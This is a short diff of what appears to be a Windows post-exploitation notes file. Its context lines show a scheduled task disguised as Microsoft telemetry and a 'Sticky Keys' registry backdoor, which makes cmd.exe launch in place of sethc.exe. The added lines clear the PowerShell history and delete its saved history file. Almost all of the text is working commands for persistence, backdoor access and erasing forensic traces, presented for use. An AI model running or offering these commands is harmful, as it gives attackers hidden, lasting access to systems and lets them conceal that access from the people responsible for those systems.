@@ -44,3 +44,6 @@ Register-ScheduledTask -TaskName "Microsoft Telemetry Cleanup" -TaskPath "\Micro
 
 Sticky Keys Registry Key (Fun Addition):
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+
+Clear PowerShell History:
+Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
